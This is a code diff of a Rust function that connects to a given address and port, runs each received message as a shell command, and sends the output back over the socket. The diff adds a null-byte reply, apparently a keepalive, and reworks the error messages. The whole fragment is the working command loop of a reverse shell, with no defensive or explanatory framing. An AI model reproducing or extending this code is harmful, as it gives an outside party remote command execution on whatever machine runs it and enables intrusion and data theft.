@@ -15,31 +15,37 @@ pub fn socket_connect(addr: &String, port: &String) {
         let data = &read_buf[..bytes_read];
 
         // execute command
-        let command = shell_execute_command(data);
+        if (data.len() == 1) && data[0] == 0 {
+            connection.write("\0".as_bytes()).unwrap();
+            connection.flush().unwrap();
+        } else {
+            let command = shell_execute_command(data);
 
-        if command.status.success() == true { // ensure command success
-            let raw = command.stdout;
-            let output = str::from_utf8(&raw).unwrap();
-    
-            if output.len() > 0 {
-                connection.write(output.as_bytes()).unwrap();
-                connection.flush().unwrap();
-            } else if output.len() == 0 {
-                connection.write(" ".as_bytes()).unwrap();
-                connection.flush().unwrap();
-            }
-        } else { // catch command error
-            let raw = command.stderr;
-            let output = str::from_utf8(&raw).unwrap();
-    
-            if output.len() > 0 {
-                connection.write(output.as_bytes()).unwrap();
-                connection.flush().unwrap();
-            } else {
-                connection.write("[COMMAND FAILED]".as_bytes()).unwrap();
-                connection.flush().unwrap();
+            if command.status.success() == true { // ensure command success
+                let raw = command.stdout;
+                let output = str::from_utf8(&raw).unwrap();
+        
+                if output.len() > 0 {
+                    connection.write(output.as_bytes()).unwrap();
+                    connection.flush().unwrap();
+                } else {
+                    connection.write("\0".as_bytes()).unwrap();
+                    connection.flush().unwrap();
+                }
+            } else { // catch command error
+                let raw = command.stderr;
+                let output = str::from_utf8(&raw).unwrap();
+        
+                if output.len() > 0 {
+                    connection.write(output.as_bytes()).unwrap();
+                    connection.flush().unwrap();
+                } else {
+                    connection.write("[UNKNOWN ERROR]".as_bytes()).unwrap();
+                    connection.flush().unwrap();
+                }
             }
         }
+        
     }
 }
 
